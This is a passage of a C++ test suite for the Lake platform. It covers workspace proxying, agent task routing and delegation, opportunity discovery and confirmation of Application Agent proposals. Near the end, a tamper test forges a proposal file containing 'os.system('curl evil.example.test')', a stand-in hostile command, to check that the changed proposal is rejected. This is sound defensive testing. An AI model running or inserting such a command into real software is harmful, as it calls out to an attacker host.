        "GET", "/v1/receive_agent_tasks?agent=agent-project&wait_ms=200", "", "", "HTTP/1.1",
        "bus-token-agent-project");
    ASSERT_TRUE(parked.starts_with("HTTP/1.1 200")) << parked;
    EXPECT_EQ(long_requests(), "1");
}

TEST_P(HttpResponseIsolation, AgentsReachAWorkspacesZettaThroughLakeInZettasShape) {
    auto* memory = dynamic_cast<lake::control::InMemoryStore*>(store_.get());
    if (memory == nullptr) {
        GTEST_SKIP() << "the operator's status is written directly only on the memory store";
    }
    auto connection = connect();
    const auto body_of = [](const std::string& response) {
        return nlohmann::json::parse(response.substr(response.find("\r\n\r\n") + 4));
    };
    const std::string cookie = sign_in(*connection);
    const nlohmann::json customers =
        body_of(connection->request("GET", "/v1/list_customers", "", cookie));
    const std::string customer_id = customers["value"]["items"][0]["id"];
    const auto requested = liquid::runtime::block_on(workspaces_->request(customer_id));
    ASSERT_TRUE(requested && *requested);
    const auto service = memory->get_service((*requested)->service_id);
    connection->workspace_id = service->workspace_id;
    selected_workspace_id_ = service->workspace_id;
    ASSERT_TRUE(memory->set_service_status(service->id, "Ready", "", "http://ws:4800"));
    std::ofstream(workspace_dir_ / (service->slug + ".json")) << R"({"kind":"zetta","token":"t"})";
    workspace_caller_->answers["list_datasets"] = {
        {"datasets", nlohmann::json::array({"accounts"})}};
    workspace_caller_->answers["create_project"] = {{"name", "churn"}};
    workspace_caller_->answers["openapi.json"] = {
        {"openapi", "3.1.0"},
        {"info", {{"title", "zetta"}}},
        {"paths",
         {{"/v1/list_datasets", {{"get", {{"operationId", "list_datasets"}}}}},
          {"/v1/create_project", {{"post", {{"operationId", "create_project"}}}}},
          {"/v1/sql", {{"get", {{"operationId", "sql"}}}}},
          {"/v1/add_nodes", {{"post", {{"operationId", "add_nodes"}}}}}}}};
    const std::string base = "/workspaces/" + customer_id + "/zetta/v1/";

    const std::string read =
        connection->request("GET", base + "list_datasets?database=main&limit=5", "", cookie);
    ASSERT_TRUE(read.starts_with("HTTP/1.1 200")) << read.substr(0, 300);
    EXPECT_EQ(body_of(read)["ok"], true);
    EXPECT_EQ(body_of(read)["value"]["datasets"][0], "accounts");
    const auto& [read_name, was_read, read_input] = workspace_caller_->calls.back();
    EXPECT_EQ(read_name, "list_datasets");
    EXPECT_TRUE(was_read);
    EXPECT_EQ(read_input["limit"], "5") << "the workspace coerces query values itself";

    const std::string act =
        connection->request("POST", base + "create_project", R"({"name":"churn"})", cookie);
    ASSERT_TRUE(act.starts_with("HTTP/1.1 200")) << act.substr(0, 300);
    EXPECT_EQ(std::get<0>(workspace_caller_->calls.back()), "create_project");
    EXPECT_EQ(std::get<2>(workspace_caller_->calls.back())["name"], "churn");

    const std::size_t reached = workspace_caller_->calls.size();
    const std::string wrong_method =
        connection->request("POST", base + "list_datasets", "", cookie);
    EXPECT_TRUE(wrong_method.starts_with("HTTP/1.1 405")) << wrong_method.substr(0, 300);
    EXPECT_EQ(response_header(wrong_method, "allow"), "GET");
    const std::string refused = connection->request("POST", base + "add_nodes", "{}", cookie);
    EXPECT_TRUE(refused.starts_with("HTTP/1.1 404")) << refused.substr(0, 300);
    EXPECT_NE(refused.find("not available through Lake"), std::string::npos);
    const std::string anonymous = connection->request("GET", base + "list_datasets");
    EXPECT_FALSE(anonymous.starts_with("HTTP/1.1 200")) << anonymous.substr(0, 300);
    const std::string other = connection->request(
        "GET",
        "/workspaces/0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0/zetta/v1/list_datasets",
        "",
        cookie);
    EXPECT_FALSE(other.starts_with("HTTP/1.1 200")) << other.substr(0, 300);
    EXPECT_EQ(workspace_caller_->calls.size(), reached) << "nothing refused reached the workspace";

    const std::string openapi = connection->request("GET", base + "openapi.json", "", cookie);
    ASSERT_TRUE(openapi.starts_with("HTTP/1.1 200")) << openapi.substr(0, 300);
    const nlohmann::json document = body_of(openapi);
    EXPECT_EQ(document["openapi"], "3.1.0") << "served bare, as Zetta serves it";
    EXPECT_TRUE(document["paths"].contains("/v1/list_datasets"));
    EXPECT_TRUE(document["paths"].contains("/v1/create_project"));
    EXPECT_FALSE(document["paths"].contains("/v1/sql"))
        << "sql is reached only through workspace_sql";
    EXPECT_FALSE(document["paths"].contains("/v1/add_nodes"));
    EXPECT_EQ(document["servers"][0]["url"],
              "/w/" + connection->workspace_id + "/workspaces/" + customer_id + "/zetta");
}

TEST_P(HttpResponseIsolation, LibraryAgentsFinishEveryTurnKindWithoutAWorkspaceEcho) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const nlohmann::json customers = nlohmann::json::parse(
        response_body(connection->request("GET", "/v1/list_customers", "", cookie)));
    const std::string customer_id = customers["value"]["items"][0]["id"];
    select_workspace(*connection, customer_id);

    const std::vector<std::pair<std::string, std::string>> turns = {
        {"agent-application", "app"},
        {"agent-project", "solution:retention"},
        {"agent-experiments", "experiment"},
    };
    for (const auto& [agent, kind] : turns) {
        const nlohmann::json input = {{"customer_id", customer_id},
                                      {"workspace_id", connection->workspace_id},
                                      {"agent", agent},
                                      {"kind", kind},
                                      {"message", "Run the regression turn"}};
        const nlohmann::json started = nlohmann::json::parse(response_body(connection->request(
            "POST",
            "/v1/agent_turn",
            input.dump(),
            cookie,
            "HTTP/1.1",
            "",
            "application/json")));
        ASSERT_EQ(started["ok"], true) << started.dump();
        const std::string task_id = started["value"]["task_id"];
        const auto task = assembled_task(task_id);
        ASSERT_TRUE(task);
        EXPECT_EQ(task->kind, kind);
        const auto dispatch = bus_->events("agent-tasks." + agent);
        const lake::control::BusEvent* event = nullptr;
        for (const auto& row : dispatch) {
            if (row.correlation_id == task_id) {
                event = &row;
                break;
            }
        }
        ASSERT_NE(event, nullptr);
        EXPECT_EQ(event->payload["workspace_id"], connection->workspace_id);

        agents_->answer = {{"ok", true},
                           {"reply", "The turn finished."},
                           {"result", {{"kind", kind}}}};
        run_agent_task(*connection, task_id, true);
        const auto finished = assembled_task(task_id);
        ASSERT_TRUE(finished);
        EXPECT_EQ(finished->phase, "Succeeded");
        EXPECT_EQ(finished->result["reply"], "The turn finished.");
    }
}

// lake#451: Talk to offers only agents a person uses, and a long turn says which agent is working
// and what it last reported, including the agent Ask Orama brought in.
TEST_P(HttpResponseIsolation, AskOramaSaysWhoIsWorkingOnALongTurn) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string customer_id =
        nlohmann::json::parse(response_body(connection->request("GET", "/v1/list_customers", "", cookie)))
            .at("value")
            .at("items")
            .at(0)
            .at("id");
    select_workspace(*connection, customer_id);

    const auto bus = [&](const std::string& agent, const std::string& path, const nlohmann::json& body) {
        return nlohmann::json::parse(response_body(connection->request(
            "POST", path, body.dump(), "", "HTTP/1.1", "bus-token-" + agent, "application/json")));
    };
    // What the web app follows while a turn runs: settle_ask_turn's task (lake#561).
    const auto turn = [&](const std::string& conversation, const std::string& task) {
        const auto [response, settled] = post_v1(*connection,
                                                 cookie,
                                                 "settle_ask_turn",
                                                 {{"customer_id", customer_id},
                                                  {"workspace_id", connection->workspace_id},
                                                  {"conversation_id", conversation},
                                                  {"task_id", task},
                                                  {"kind", "ask"}});
        EXPECT_TRUE(response.starts_with("HTTP/1.1 200")) << response;
        return settled["value"];
    };
    const auto [sent_response, sent] = post_v1(*connection,
                                               cookie,
                                               "send_ask_message",
                                               {{"customer_id", customer_id},
                                                {"workspace_id", connection->workspace_id},
                                                {"agent", "agent-ask-orama"},
                                                {"message", "what should I build?"}});
    ASSERT_TRUE(sent.value("ok", false)) << sent_response;
    const std::string conversation = sent["value"]["conversation_id"];
    const std::string task = sent["value"]["task_id"];
    ASSERT_FALSE(task.empty());
    EXPECT_TRUE(agents_->turns.empty()) << "the request never waits on the agent (lake#269)";
    EXPECT_EQ(turn(conversation, task)["task"]["status"], "pending");

    const nlohmann::json claimed =
        bus("agent-ask-orama", "/v1/claim_agent_task", {{"task_id", task}, {"agent", "agent-ask-orama"}});
    ASSERT_EQ(claimed["ok"], true) << claimed.dump();
    const std::string credential = claimed["value"]["body"].value("lake_token", std::string());
    ASSERT_EQ(bus("agent-ask-orama", "/v1/publish_agent_event",
                  {{"task_id", task}, {"agent", "agent-ask-orama"}, {"type", "progress"},
                   {"message", "Working on it"}})["ok"],
              true);
    const auto working = turn(conversation, task);
    EXPECT_EQ(working["settled"], false);
    EXPECT_EQ(working["task"]["status"], "running");
    EXPECT_EQ(working["task"]["message"], "Working on it");
    EXPECT_FALSE(working["task"]["created_at"].get<std::string>().empty())
        << "how long it has worked";

    // Ask Orama brings in the Auto-Suggest Agent with its turn key; the asking turn reports it.
    const std::string delegated = connection->request(
        "POST", "/v1/agent_turn",
        nlohmann::json{{"customer_id", customer_id},
                       {"workspace_id", connection->workspace_id},
                       {"agent", "agent-autosuggest"},
                       {"message", "What is worth building?"}}
            .dump(),
        "", "HTTP/1.1", credential, "application/json");
    ASSERT_TRUE(delegated.starts_with("HTTP/1.1 200")) << delegated;
    const std::string child =
        nlohmann::json::parse(response_body(delegated))["value"].value("task_id", std::string());
    ASSERT_FALSE(child.empty()) << delegated;
    EXPECT_EQ(assembled_task(child)->body.value("parent_task_id", std::string()), task);
    EXPECT_EQ(store_->get_agent_task(child)->parent_task_id, task) << "routing stays central";
    EXPECT_EQ(store_->get_agent_task(task)->message, "") << "the report is in the workspace";
    EXPECT_EQ(assembled_task(task)->message,
              "Ask Orama asked Auto-Suggest Agent: What is worth building?");
    EXPECT_EQ(turn(conversation, task)["task"]["message"],
              "Ask Orama asked Auto-Suggest Agent: What is worth building?");

    ASSERT_EQ(bus("agent-autosuggest", "/v1/claim_agent_task",
                  {{"task_id", child}, {"agent", "agent-autosuggest"}})["ok"],
              true);
    ASSERT_EQ(bus("agent-autosuggest", "/v1/publish_agent_event",
                  {{"task_id", child}, {"agent", "agent-autosuggest"}, {"type", "progress"},
                   {"message", "Reading 4 datasets"}})["ok"],
              true);
    EXPECT_EQ(turn(conversation, task)["task"]["message"], "Auto-Suggest Agent: Reading 4 datasets")
        << "the subagent's progress shows on the person's turn";
    bool published = false;
    for (const auto& [name, read, input] : workspace_caller_->calls) {
        if (name == "publish_event" && input.value("correlation_id", std::string()) == task) {
            const nlohmann::json event = nlohmann::json::parse(input.value("payload", std::string("{}")));
            published = published || (event.value("delegated_task_id", std::string()) == child &&
                                       event.value("message", std::string()) ==
                                           "Auto-Suggest Agent: Reading 4 datasets");
        }
    }
    EXPECT_TRUE(published) << "the asking turn's progress is on the workspace's agent-events";

    ASSERT_EQ(bus("agent-autosuggest", "/v1/publish_agent_event",
                  {{"task_id", child}, {"agent", "agent-autosuggest"}, {"type", "result"},
                   {"result", {{"ok", true}, {"reply", "Churn"}}}})["ok"],
              true);
    EXPECT_EQ(turn(conversation, task)["task"]["message"],
              "Auto-Suggest Agent finished; writing the answer.");
    ASSERT_EQ(bus("agent-ask-orama", "/v1/publish_agent_event",
                  {{"task_id", task}, {"agent", "agent-ask-orama"}, {"type", "result"},
                   {"result", {{"ok", true}, {"reply", "Build churn."}}}})["ok"],
              true);
    const auto answered = turn(conversation, task);
    EXPECT_EQ(answered["settled"], true);
    EXPECT_EQ(answered["task"]["status"], "succeeded");
    const auto messages = get_v1(*connection,
                                 cookie,
                                 "get_ask_conversation?customer_id=" + customer_id +
                                     "&workspace_id=" + connection->workspace_id +
                                     "&conversation_id=" + conversation)["value"]["messages"];
    ASSERT_EQ(messages.size(), 2U) << messages.dump();
    EXPECT_EQ(messages[1]["content"], "Build churn.");
}

// Discover (lake#269, lake#376): Auto-Suggest Agent scans in the background, its Opportunities are kept
// in the workspace, a chosen one becomes a project, and the Project Agent's design is applied to it
// once, wherever its task is read.
TEST_P(HttpResponseIsolation, DiscoverOpportunitiesScansAndCreatesProjects) {
    auto* memory = dynamic_cast<lake::control::InMemoryStore*>(store_.get());
    if (memory == nullptr) {
        GTEST_SKIP() << "the operator's status is written directly only on the memory store";
    }
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string customers_response =
        connection->request("GET", "/v1/list_customers", "", cookie);
    const std::string customer_id =
        nlohmann::json::parse(customers_response.substr(customers_response.find("\r\n\r\n") + 4))
            .at("value")
            .at("items")
            .at(0)
            .at("id");
    const auto requested = liquid::runtime::block_on(workspaces_->request(customer_id));
    const auto service = memory->get_service((*requested)->service_id);
    connection->workspace_id = service->workspace_id;
    selected_workspace_id_ = service->workspace_id;
    ASSERT_TRUE(memory->set_service_status(service->id, "Ready", "", "http://ws:4800"));
    std::ofstream(workspace_dir_ / (service->slug + ".json")) << R"({"kind":"zetta","token":"t"})";
    workspace_caller_->answers["list_datasets"] = {
        {"datasets", nlohmann::json::array({{{"name", "accounts"}}})}};
    workspace_caller_->answers["create_project"] = {{"name", "x"}};

    agents_->answer = {
        {"ok", true},
        {"result",
         {{"project_profile",
           {{"suggested",
             nlohmann::json::array({{{"intent", "Predict which accounts will churn"},
                                     {"solution", "S-1"},
                                     {"methodology", "gbdt"},
                                     {"why_this_data_supports_it", "accounts.churned is the label"},
                                     {"required_first", {"entity resolution"}}}})},
            {"declined",
             nlohmann::json::array({{{"intent", "Forecast revenue"},
                                     {"reason", "no timestamp column"},
                                     {"answer", "capture it first"}}})}}}}}};
    // The scan runs in the background (lake#269): the request returns at once.
    const std::string scope =
        "customer_id=" + customer_id + "&workspace_id=" + connection->workspace_id;
    const auto [scanned_response, scanned] =
        post_v1(*connection,
                cookie,
                "agent_turn",
                {{"customer_id", customer_id},
                 {"workspace_id", connection->workspace_id},
                 {"agent", "agent-autosuggest"},
                 {"kind", "discover"},
                 {"message", "What could this workspace build from its data?"}});
    ASSERT_TRUE(scanned.value("ok", false)) << scanned_response.substr(0, 300);
    EXPECT_TRUE(agents_->turns.empty()) << "the request never waits on the Auto-Suggest Agent";
    const std::string task = scanned["value"]["task_id"];
    ASSERT_FALSE(task.empty());
    EXPECT_EQ(get_v1(*connection,
                     cookie,
                     "get_agent_task?" + scope + "&task_id=" + task)["value"]["status"],
              "pending");
    run_agent_task(*connection, task);
    EXPECT_FALSE(agents_->turns.back().contains("profile"))
        << "Auto-Suggest Agent builds the profile itself with its read-only credential";
    EXPECT_FALSE(agents_->turns.back()["zetta_token"].get<std::string>().empty());

    const auto found =
        get_v1(*connection, cookie, "list_opportunities?" + scope + "&task_id=" + task);
    ASSERT_TRUE(found.value("ok", false)) << found.dump();
    const std::string listed_scan = found["value"].dump();
    EXPECT_NE(listed_scan.find("Predict which accounts will churn"), std::string::npos);
    EXPECT_NE(listed_scan.find("S-1"), std::string::npos);
    EXPECT_NE(listed_scan.find("no timestamp column"), std::string::npos);
    // The Opportunities are in the workspace's Zetta (lake#376), read as the person.
    const auto opportunities = [&] {
        const std::string listed = connection->request(
            "GET",
            "/v1/list_opportunities?customer_id=" + customer_id + "&workspace_id=" +
                connection->workspace_id,
            "", cookie);
        return nlohmann::json::parse(listed.substr(listed.find("\r\n\r\n") + 4))["value"]
            .value("opportunities", nlohmann::json::array());
    };
    const auto rows = opportunities();
    ASSERT_EQ(rows.size(), 2U);
    const auto chosen = std::ranges::find_if(
        rows, [](const nlohmann::json& row) { return row.at("status") == "new"; });
    ASSERT_NE(chosen, rows.end());
    const std::string chosen_id = chosen->at("id");

    const auto [created_response, created] =
        post_v1(*connection,
                cookie,
                "create_projects_from_opportunities",
                {{"customer_id", customer_id},
                 {"workspace_id", connection->workspace_id},
                 {"opportunity_ids", nlohmann::json::array({chosen_id})}});
    ASSERT_TRUE(created.value("ok", false)) << created_response.substr(0, 300);
    const auto project_call = std::ranges::find_if(
        workspace_caller_->calls.rbegin(), workspace_caller_->calls.rend(),
        [](const auto& call) { return std::get<0>(call) == "create_project"; });
    ASSERT_NE(project_call, workspace_caller_->calls.rend());
    const auto& [name, read, input] = *project_call;
    EXPECT_EQ(name, "create_project");
    EXPECT_TRUE(input["name"].get<std::string>().starts_with("predict-which-accounts-will-churn-"));
    EXPECT_NE(input["description"].get<std::string>().find("Source Opportunity"),
              std::string::npos);
    EXPECT_EQ(input["intent"], "Predict which accounts will churn");
    // A copy: the recorded calls grow (and move) with every later call.
    const std::string project = input["name"];
    const auto after = opportunities();
    const auto made = std::ranges::find_if(
        after, [&](const nlohmann::json& row) { return row.at("id") == chosen_id; });
    ASSERT_NE(made, after.end());
    EXPECT_EQ(made->at("status"), "project");
    EXPECT_EQ(made->at("project"), project);
    // Dismissing goes through the same workspace record, conditionally on its revision.
    const auto declined = std::ranges::find_if(
        after, [](const nlohmann::json& row) { return row.at("status") == "not_yet"; });
    ASSERT_NE(declined, after.end());
    const auto [dismissed_response, dismissed] =
        post_v1(*connection,
                cookie,
                "dismiss_opportunity",
                {{"customer_id", customer_id},
                 {"workspace_id", connection->workspace_id},
                 {"opportunity_id", declined->at("id")}});
    ASSERT_TRUE(dismissed.value("ok", false)) << dismissed_response.substr(0, 300);
    const auto finally = opportunities();
    EXPECT_EQ(std::ranges::count_if(finally, [](const nlohmann::json& row) {
                  return row.at("status") == "dismissed";
              }),
              1);

    // The Project Agent designs the new project's pipeline in the background, and reading its task
    // (the project page's latest_agent_task) compiles the design once it is done (Steve,
    // 2026-09-27).
    const auto latest_build =
        store_->latest_agent_task(customer_id, "build:" + project, connection->workspace_id);
    ASSERT_TRUE(latest_build) << "creating the project started the Project Agent";
    const auto build = assembled_task(latest_build->id);
    ASSERT_TRUE(build);
    EXPECT_EQ(build->agent, "agent-project");
    EXPECT_NE(build->body["message"].get<std::string>().find("Predict which accounts will churn"),
              std::string::npos);
    workspace_caller_->answers["get_project"] = {{"name", project},
                                                 {"graphs", nlohmann::json::array()}};
    const auto read_build = [&] {
        return get_v1(*connection,
                      cookie,
                      "latest_agent_task?" + scope +
                          "&subject=" + lake::api::oauth_url_encode("build:" + project));
    };
    const auto designing = read_build();
    ASSERT_TRUE(designing.value("ok", false)) << designing.dump();
    ASSERT_TRUE(designing["value"]["task"].is_object()) << designing.dump();
    EXPECT_EQ(designing["value"]["task"]["status"], "pending");
    EXPECT_EQ(std::ranges::count_if(workspace_caller_->calls,
                                    [](const auto& call) {
                                        return std::get<0>(call) == "compile_intent";
                                    }),
              0)
        << "nothing is compiled before the design exists";

    agents_->answer = {
        {"ok", true},
        {"result",
         {{"applied", false},
          {"pipeline",
           {{"dataset", "datasets.accounts"},
            {"label", "churned"},
            {"features", {"failed_payments", "tenure_months"}},
            {"model_kind", "gbdt"},
            {"holdout_fraction", 0.2}}}}}};
    run_agent_task(*connection, build->id);
    workspace_caller_->answers["capture_intent"] = {{"input_id", "in-1"}};
    workspace_caller_->answers["compile_intent"] = {{"name", "churn"}};
    workspace_caller_->answers["get_graph"] = {
        {"name", "churn"},
        {"nodes",
         {{{"id", "load"}, {"kind", "connect"}, {"name", "Load"}},
          {{"id", "extra"}, {"kind", "connect"}, {"name", "Extra"}},
          {{"id", "train"}, {"kind", "model"}, {"name", "Train"}}}},
        {"edges", nlohmann::json::array()}};
    const auto built = read_build();
    ASSERT_TRUE(built.value("ok", false)) << built.dump();
    const auto captured = std::ranges::find_if(workspace_caller_->calls, [](const auto& call) {
        return std::get<0>(call) == "capture_intent";
    });
    ASSERT_NE(captured, workspace_caller_->calls.end());
    const std::string text = std::get<2>(*captured)["text"];
    EXPECT_NE(text.find("Predict churned from datasets.accounts using failed_payments, "
                        "tenure_months."),
              std::string::npos)
        << text;
    EXPECT_NE(text.find("Train a gbdt model with a 20% hold-out."), std::string::npos) << text;
    const auto saved = std::ranges::find_if(workspace_caller_->calls, [](const auto& call) {
        return std::get<0>(call) == "save_graph";
    });
    ASSERT_NE(saved, workspace_caller_->calls.end()) << "pointed at the design's dataset";
    EXPECT_NE(std::get<2>(*saved).dump().find("\"table\":\"accounts\""), std::string::npos)
        << std::get<2>(*saved).dump();
    EXPECT_NE(std::get<2>(*saved).dump().find("\"target\":\"churned\""), std::string::npos)
        << "the model step learns the design's target";

    // Zetta compiles a pipeline from a project's intent when it is created, and a design may name
    // its table under training_sources: the project's own pipeline is pointed at it, once.
    const auto second = store_->latest_agent_task(customer_id, "build:" + project, connection->workspace_id);
    const std::string again = lake::control::new_uuid_v4();
    auto rebuild = store_->create_agent_task(lake::control::AgentTask{
        .customer_id = customer_id, .agent = "agent-project", .kind = "build:" + project,
        .workspace_id = second->workspace_id,
        .body = {{"message", "Design it"}}, .scopes = second->scopes,
        .requested_by_user_id = second->requested_by_user_id,
        .requested_by_taap_id = second->requested_by_taap_id});
    ASSERT_TRUE(rebuild);
    lake::test::seed_agent_task_request(workspaces_, *rebuild, {{"message", "Design it"}},
                                        instance_kek_);
    ASSERT_TRUE(liquid::runtime::block_on(agent_bus_->publish_task(*rebuild)).value());
    agents_->answer = {{"ok", true},
                       {"result",
                        {{"pipeline",
                          {{"training_sources", {"datasets.accounts_v2"}},
                           {"label", "churned"},
                           {"model_kind", "gbdt"}}}}}};
    run_agent_task(*connection, rebuild->id);
    workspace_caller_->answers["get_project"] = {
        {"name", project},
        {"graphs", {{{"name", "churn skeleton"}, {"approval", "proposed"}}}}};
    const std::size_t compiles = std::ranges::count_if(workspace_caller_->calls, [](const auto& call) {
        return std::get<0>(call) == "compile_intent";
    });
    read_build();
    EXPECT_EQ(std::ranges::count_if(workspace_caller_->calls,
                                    [](const auto& call) {
                                        return std::get<0>(call) == "compile_intent";
                                    }),
              compiles)
        << "a project that has a pipeline is not compiled again";
    const auto repointed = std::ranges::find_if(
        workspace_caller_->calls.rbegin(), workspace_caller_->calls.rend(),
        [](const auto& call) { return std::get<0>(call) == "save_graph"; });
    ASSERT_NE(repointed, workspace_caller_->calls.rend());
    EXPECT_NE(std::get<2>(*repointed).dump().find("\"table\":\"accounts_v2\""), std::string::npos)
        << std::get<2>(*repointed).dump();
    const std::size_t saves = std::ranges::count_if(workspace_caller_->calls, [](const auto& call) {
        return std::get<0>(call) == "save_graph";
    });
    workspace_caller_->answers["get_graph"]["nodes"][0]["attributes"] = {{"source", "datasets"},
                                                                         {"table", "accounts_v2"}};
    read_build();
    EXPECT_EQ(std::ranges::count_if(workspace_caller_->calls,
                                    [](const auto& call) { return std::get<0>(call) == "save_graph"; }),
              saves)
        << "applied once: a pipeline that reads the design's table is left alone";

    // A retrieval design has no label or model (the model writes null): it still applies, and a
    // task that cannot be read says so (live, 2026-09-27: "type must be string").
    auto retrieval = store_->create_agent_task(lake::control::AgentTask{
        .customer_id = customer_id, .agent = "agent-project", .kind = "build:" + project,
        .workspace_id = second->workspace_id,
        .body = {{"message", "Design it"}}, .scopes = second->scopes,
        .requested_by_user_id = second->requested_by_user_id,
        .requested_by_taap_id = second->requested_by_taap_id});
    ASSERT_TRUE(retrieval);
    lake::test::seed_agent_task_request(workspaces_, *retrieval, {{"message", "Design it"}},
                                        instance_kek_);
    ASSERT_TRUE(liquid::runtime::block_on(agent_bus_->publish_task(*retrieval)).value());
    agents_->answer = {{"ok", true},
                       {"result",
                        {{"pipeline",
                          {{"sources", {"churn_results.at_risk_1"}},
                           {"label", nullptr},
                           {"model_kind", nullptr},
                           {"model", false}}}}}};
    run_agent_task(*connection, retrieval->id);
    const auto applied = read_build();
    ASSERT_TRUE(applied.value("ok", false)) << applied.dump();
    EXPECT_FALSE(applied["value"]["task"].contains("build_error")) << "null fields are no error";
    const auto retrieved = std::ranges::find_if(
        workspace_caller_->calls.rbegin(), workspace_caller_->calls.rend(),
        [](const auto& call) { return std::get<0>(call) == "save_graph"; });
    EXPECT_NE(std::get<2>(*retrieved).dump().find("\"table\":\"at_risk_1\""), std::string::npos);
}

// lake#440: Ship > Packages dropped the connection when the space had a build with no digest yet.
TEST_P(HttpResponseIsolation, ShipPackagesListsABuildThatHasNoDigestYet) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string customers_response =
        connection->request("GET", "/v1/list_customers", "", cookie);
    const nlohmann::json customers = nlohmann::json::parse(response_body(customers_response));
    const std::string customer_id = customers["value"]["items"][0]["id"];
    select_workspace(*connection, customer_id);
    const auto repository = store_->create_repository({customer_id, "scoring", "", "private",
                                                       lake::test::repository_workspace(
                                                           *store_, customer_id)});
    ASSERT_TRUE(repository) << repository.error().message;
    const auto queued = store_->create_build({.customer_id = customer_id,
                                              .workspace_id = connection->workspace_id,
                                              .repository = repository->id,
                                              .revision = "main",
                                              .target = "lake.example.test/acme/scoring:v3"});
    ASSERT_TRUE(queued) << queued.error().message;
    ASSERT_TRUE(queued->digest.empty());

    // Ship > Packages reads the catalog and the workspace's builds through the API.
    const auto catalog = get_v1(*connection, cookie, "list_packages?customer_id=" + customer_id);
    EXPECT_TRUE(catalog.value("ok", false)) << catalog.dump();
    const auto builds = get_v1(*connection,
                               cookie,
                               "list_builds?customer_id=" + customer_id +
                                   "&workspace_id=" + connection->workspace_id);
    ASSERT_TRUE(builds.value("ok", false)) << builds.dump();
    const std::string listed = builds["value"].dump();
    EXPECT_NE(listed.find(queued->id), std::string::npos) << listed;
    EXPECT_NE(listed.find("lake.example.test/acme/scoring:v3"), std::string::npos) << listed;
}

TEST_P(HttpResponseIsolation, ShipAppsCreatesOperatesAndFollowsAnApp) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const nlohmann::json customers = get_v1(*connection, cookie, "list_customers");
    const std::string customer_id = customers["value"]["items"][0]["id"];
    select_workspace(*connection, customer_id);
    const std::string workspace_id = connection->workspace_id;
    const std::string scope = "customer_id=" + customer_id + "&workspace_id=" + workspace_id;
    // An Application Agent turn as Ship > Apps sends it.
    const auto turn = [&](nlohmann::json input) {
        input["customer_id"] = customer_id;
        input["workspace_id"] = workspace_id;
        input["agent"] = "agent-application";
        input["kind"] = "app";
        return post_v1(*connection, cookie, "agent_turn", input);
    };

    const auto [started_response, started] = turn({{"message", "Build a customer health app"}});
    ASSERT_TRUE(started.value("ok", false)) << started_response.substr(0, 300);
    const std::string agent_task = started["value"]["task_id"];
    const auto first_task = assembled_task(agent_task);
    ASSERT_TRUE(first_task);
    EXPECT_EQ(first_task->agent, "agent-application");
    EXPECT_EQ(first_task->kind, "app");
    EXPECT_EQ(first_task->body["context"], nlohmann::json::object());
    EXPECT_EQ(std::ranges::find(first_task->scopes, "create_app"), first_task->scopes.end());
    // A confirmed retry looks up the repository its earlier attempt created.
    EXPECT_NE(std::ranges::find(first_task->scopes, "list_repositories"),
              first_task->scopes.end());
    EXPECT_NE(std::ranges::find(first_task->scopes, "get_repository"), first_task->scopes.end());

    agents_->answer = {{"ok", true},
                       {"reply", "Which dataset should the app use?"},
                       {"result", {{"kind", "question"}, {"confirm", false}}}};
    connection.reset();
    connection = connect();
    run_agent_task(*connection, agent_task);
    // The reply continues the same conversation.
    const auto [replied_response, replied] = turn(
        {{"message", "Use datasets/accounts"}, {"conversation_id", first_task->conversation_id}});
    ASSERT_TRUE(replied.value("ok", false)) << replied_response.substr(0, 300);
    const std::string proposal_task = replied["value"]["task_id"];
    const auto continued_task = assembled_task(proposal_task);
    ASSERT_TRUE(continued_task);
    EXPECT_EQ(continued_task->conversation_id, first_task->conversation_id);
    EXPECT_EQ(continued_task->body["message"], "Use datasets/accounts");
    EXPECT_EQ(continued_task->body["prior_turn"]["task_id"], agent_task);

    const nlohmann::json proposal = {
        {"kind", "proposal"},
        {"confirm", true},
        {"files",
         nlohmann::json::array(
             {{{"path", "app.py"}, {"contents", "def health():\n    return 'healthy'\n"}}})},
        {"app",
         {{"name", "customer-health"},
          {"mode", "runtime"},
          {"repository", {{"name", "app-customer-health"}}},
          {"path", "."},
          {"framework", "fastapi"},
          {"port", 8080},
          {"auth", "none"}}}};
    agents_->answer = {{"ok", true},
                       {"reply", "Review the customer health app."},
                       {"result", proposal}};
    connection.reset();
    connection = connect();
    run_agent_task(*connection, proposal_task);
    const auto proposed =
        get_v1(*connection, cookie, "get_agent_task?" + scope + "&task_id=" + proposal_task);
    ASSERT_TRUE(proposed.value("ok", false)) << proposed.dump();
    const std::string proposal_sha = proposed["value"]["proposal_sha256"];
    EXPECT_EQ(proposal_sha, lake::api::agent_proposal_digest(proposal));

    // lake checks a confirmation against the stored proposal (lake#561): without the proposing
    // turn, for a turn that proposed nothing, for another proposal or a changed one, and for a
    // public app nobody acknowledged, nothing starts.
    const std::size_t tasks_before = bus_->events("agent-tasks.agent-application").size();
    const auto confirm = [&](const std::string& task,
                             const std::string& sha,
                             const nlohmann::json& confirmed,
                             bool acknowledged) {
        nlohmann::json context{{"confirmed_proposal", confirmed}};
        if (acknowledged) {
            context["confirm_public"] = true;
        }
        nlohmann::json input{{"message", "Confirm and deploy the reviewed proposal."},
                             {"proposal_sha256", sha},
                             {"context", context}};
        if (!task.empty()) {
            input["proposal_task_id"] = task;
        }
        return turn(input);
    };
    const auto refused = [&](const std::string& task,
                             const std::string& sha,
                             const nlohmann::json& confirmed,
                             bool acknowledged,
                             std::string_view status,
                             std::string_view message) {
        const auto [response, body] = confirm(task, sha, confirmed, acknowledged);
        EXPECT_TRUE(response.starts_with("HTTP/1.1 " + std::string(status))) << response;
        EXPECT_NE(body["error"].value("message", std::string()).find(message), std::string::npos)
            << response;
    };
    refused("", proposal_sha, proposal, true, "400", "proposal_task_id");
    refused(agent_task,
            proposal_sha,
            proposal,
            true,
            "400",
            "That task has no Application Agent proposal to confirm.");
    nlohmann::json forged = proposal;
    forged["files"][0]["contents"] = "import os\nos.system('curl evil.example.test')\n";
    refused(proposal_task,
            proposal_sha,
            forged,
            true,
            "409",
            "The Application Agent proposal changed before confirmation.");
    refused(proposal_task,
            lake::api::agent_proposal_digest(forged),
            forged,
            true,
            "409",
            "The Application Agent proposal changed before confirmation.");
    refused(proposal_task,
            std::string(64, '0'),
            proposal,
            true,
            "409",
            "The Application Agent proposal changed before confirmation.");
    refused(proposal_task, proposal_sha, proposal, false, "400", "This app will be public.");
